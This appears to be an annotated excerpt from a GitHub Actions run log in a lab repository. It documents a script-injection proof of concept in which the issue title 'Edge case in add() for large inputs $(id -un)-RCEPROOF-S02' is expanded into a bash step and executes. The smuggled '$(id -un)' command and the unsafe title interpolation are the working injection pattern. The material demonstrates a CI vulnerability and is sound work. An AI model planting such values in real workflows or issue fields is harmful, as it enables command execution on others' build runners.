@@ -1,0 +1,31 @@
+# Excerpt from the "triage" job of run 39404529625 on
+# turla-lab-targets/script-injection-target (event: issues: opened).
+# Full run: https://github.com/turla-lab-targets/script-injection-target/actions/runs/39404529625
+#
+# The attacker-controlled issue title was:
+#   Edge case in add() for large inputs $(id -un)-RCEPROOF-S02
+#
+# GitHub Actions expanded ${{ github.event.issue.title }} as a literal
+# string substitution into the generated bash script BEFORE the shell ran.
+# The $( ) survived into the script and the shell executed it.
+
+##[group]GITHUB_TOKEN Permissions
+Contents: read
+Issues: write
+Metadata: read
+##[endgroup]
+
+##[group]Run echo "Thanks for opening: Edge case in add() for large inputs $(id -un)-RCEPROOF-S02"
+echo "Thanks for opening: Edge case in add() for large inputs $(id -un)-RCEPROOF-S02"
+echo "Triage complete."
+shell: /usr/bin/bash -e {0}
+env:
+  GITHUB_TOKEN: ***
+  DUMMY_CLOUD_KEY:
+##[endgroup]
+
+# ---- Executed output (proof of injection) ----
+# $(id -un) resolved to the runner user "runner"; inert data would have
+# printed the literal "$(id -un)" instead.
+Thanks for opening: Edge case in add() for large inputs runner-RCEPROOF-S02
+Triage complete.
